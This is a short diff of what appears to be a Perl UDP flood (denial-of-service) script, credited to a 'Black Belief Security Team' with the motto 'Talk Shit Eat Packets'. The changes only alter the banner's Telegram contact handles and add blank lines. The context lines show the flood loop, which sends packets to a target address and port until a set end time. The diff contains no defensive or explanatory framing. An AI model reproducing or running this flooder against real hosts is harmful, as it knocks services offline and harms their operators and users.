@@ -31,8 +31,8 @@ print <<EOTEXT;
 ====================================
 #  Black Belief Security Team      #
 #          Mr.<V>ito               #
-#  Telegram:@MrVito and @Mr_Vito_X #
-#            <V>ito                #
+# Telegram:@BlackBeliefSecurityTeam#
+# My id(telegram):@Mr0Vito         #
 #           version:1              #
 ====================================
 #     Talk Shit Eat Packets        # 
@@ -57,3 +57,6 @@ for (;time() <= $endtime;) {
  
   send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
 $iaddr));}
+
+ 
+ 
